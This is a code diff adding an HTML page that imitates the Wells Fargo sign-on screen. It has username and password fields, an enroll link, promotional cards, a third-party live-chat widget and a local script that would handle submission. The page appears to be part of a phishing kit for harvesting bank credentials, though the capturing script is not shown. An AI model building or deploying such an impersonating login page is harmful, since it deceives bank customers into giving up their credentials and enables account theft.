@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Login</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="login-page">
+    <div class="mobile-header">
+
+
+    <div class="login-container">
+        <div class="bank-header">
+            <div class="bank-logo">
+
+            </div>
+            <h1>Wells Fargo</h1>
+            <div class="greeting">Good morning</div>
+        </div>
+
+        <div class="login-form-container">
+            <form id="loginForm" class="login-form">
+                <div class="form-group" style="position: relative;">
+                    <input type="text" id="username" name="username" placeholder="Username" required>
+                </div>
+                <div class="form-group" style="position: relative;">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <span class="show-password">Show</span>
+                </div>
+                <div class="form-group checkbox">
+                    <input type="checkbox" id="saveUsername" name="saveUsername">
+                    <label for="saveUsername">Save username</label>
+                </div>
+                <div class="form-actions" style="display: flex; gap: 10px;">
+                    <button type="button" class="btn btn-outline" onclick="window.location.href='register.html'" style="flex: 1;">Enroll</button>
+                    <button type="submit" class="btn btn-primary" style="flex: 1; background-color: #ccc; color: #333;">Sign On</button>
+                </div>
+                <div class="form-links">
+                    <a href="#" class="forgot-link">Forgot username or password?</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="login-features">
+            <div class="feature-card">
+                <div class="feature-icon">⭐</div>
+                <div class="feature-content">
+                    <h3>Explore our products</h3>
+                    <a href="#">Find your fit</a>
+                </div>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">⭐</div>
+                <div class="feature-content">
+                    <h3>Earn 20K bonus points</h3>
+                    <a href="#">Learn More</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Begin of Chaport Live Chat code --> <script type="text/javascript"> (function(w,d,v3){ w.chaportConfig = { appId : '683098c2bf5c565fccc10636' };  if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document); </script> <!-- End of Chaport Live Chat code -->
+
+    
+
+    <script src="js/script.js"></script>
+</body>
+</html>
